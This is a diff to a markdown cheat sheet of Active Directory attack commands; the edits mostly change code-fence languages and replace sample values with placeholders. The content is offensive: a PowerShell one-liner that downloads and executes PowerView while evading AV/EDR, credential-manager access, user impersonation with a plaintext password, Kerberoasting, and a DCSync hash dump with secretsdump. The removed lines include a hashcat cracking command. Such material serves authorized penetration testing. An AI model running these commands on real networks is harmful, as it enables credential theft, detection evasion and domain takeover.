@@ -33,7 +33,7 @@ This command create a directory cme_spider_plus in /tmp (for Linux). To retrive 
 grep -rnw ./ -e 'password'
 ```
 
-If CME is detected by AV/EDR, use PowerShell one-liner PowerView :
+If detected by AV/EDR, try PowerShell one-liner PowerView :
 
 ```powershell
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
@@ -83,13 +83,13 @@ pypykatz lsa minidump 'XXX.DMP'
 ```
 ### Others
 Native Windows command :
-```powershell
+```cmd
 rundll32 keymgr.dll, KRShowKeyMgr
 ```
 Savoir : Mimikatz recompiled in Go lang : https://github.com/vincd/savoir
 
 ## Impersonation
-```markdown
+```powershell
 $password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
@@ -97,18 +97,12 @@ Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COM
 
 ## Kerberoast
 GetUserSPNs and get hashes :
-```markdown
-impacket-GetUserSPNs -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
+```bash
+impacket-GetUserSPNs -request -dc-ip IP_ADDRESS DOMAIN/USERNAME -outputfile hashes.kerberoast
 ```
-
-Crack hashes :
-```markdown
-hashcat -m 13100 hashes.kerberoast wordlist -O
-```
-
-DCSync exploit :
-```markdown
-impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<ipaddress>
+If you get hashes, try to crack it and then use DCSync exploit :
+```bash
+impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
 ```
 
 ## AS-REP Roasting
